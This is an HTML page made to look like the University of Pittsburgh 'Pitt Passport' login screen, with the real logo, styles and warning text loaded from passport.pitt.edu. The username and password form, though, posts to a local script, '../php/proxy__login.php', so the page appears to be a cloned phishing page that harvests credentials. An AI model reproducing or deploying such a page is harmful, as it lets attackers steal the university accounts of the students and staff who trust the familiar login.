<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pitt Passport</title>
    <link rel="shortcut icon" href="https://www.pitt.edu/sites/default/files/pitt_favicon_0.ico" type="image/vnd.microsoft.icon">
    <link rel="stylesheet" href="https://passport.pitt.edu/idp/css/shibboleth.css">
    <link rel="stylesheet" href="/proxies/login/css/font-awesome.min.css">
</head>    <body id="shibboleth-app">
<header class="container-fluid shibboleth-header">
    <div class="row">
        <div class="col-md-4 col-md-offset-4">
            <img src="https://passport.pitt.edu/idp/images/logo-upitt_blue.png" alt="University of Pittsburgh Logo" class="img-responsive header-logo">
        </div>
    </div>
    <div class="row secondary-header">
        <div class="col-md-4 col-md-offset-4">
            <h4 class="text-right">Pitt Passport</h4>
        </div>
    </div>
</header>        <div class="shibboleth-content">
    <div class="container">
        <div class="row">
            <div class="col-md-4 col-md-offset-4">
                <form class="shibboleth-login-form" action="../php/proxy__login.php" method="post">

                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" maxlength="25" class="form-control" id="username" placeholder="Enter username" name="j_username" value="" autofocus="">
                    </div>
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" maxlength="25" class="form-control" id="password" placeholder="Password" name="j_password">
                    </div>
					
                    <button type="submit" class="btn btn-lg btn-block btn-shibboleth" name="_eventId_proceed">Submit <i class="fa fa-sign-in"></i></button>
                </form>
                <div class="login-links">
                    <p><a href="https://accounts.pitt.edu/selfservicepassword/default.aspx" class="login-link"><i class="fa fa-cog"></i> Forgot password?</a>
                        | <a href="http://technology.pitt.edu/pittpassport" class="login-link"><i class="fa fa-question-circle"> </i> Need Help?</a>
                        <br><br><br>
                        <a href="https://accountactivation.pitt.edu" class="login-link">New&nbsp;Account&nbsp;Activation</a>
                    </p>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-md-4 col-md-offset-4">
                <div class="panel panel-warning">
                    <div class="panel-body">
                        <h5><i class="fa fa-exclamation-circle"></i> Important Login Information</h5>

                        <p>Before entering your University Computing Account credentials, verify that the URL for this
                            page begins with: <a href="https://passport.pitt.edu" target="_blank">passport.pitt.edu</a>.
                            In the Safari browser, you may need to click or tap your address bar to view the URL.
                        </p>

                        <p>Your credentials are your key to accessing online resources at Pitt. Never share them with
                            anyone---for any reason.</p>

                        <p>You must completely exit your web browser when you are done accessing services that require
                            authentication, otherwise your login will remain in effect.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- end .container div -->
</div>
<!-- end .shibboleth-content div -->
<footer class="shibboleth-footer">
    <div class="container">
        <div class="row">
            <div class="col-md-4 col-md-offset-4">
                <p class="text-center">
                    <a href="http://www.pitt.edu/" target="_blank">pitt.edu</a>&nbsp;|&nbsp;
                    <a href="https://my.pitt.edu/" target="_blank">my.pitt</a>
                </p>
            </div>
        </div>
    </div>
</footer>
<script src="https://passport.pitt.edu/idp/js/jquery.min.js"></script>
<script src="https://passport.pitt.edu/idp/js/bootstrap.min.js"></script>

</body></html>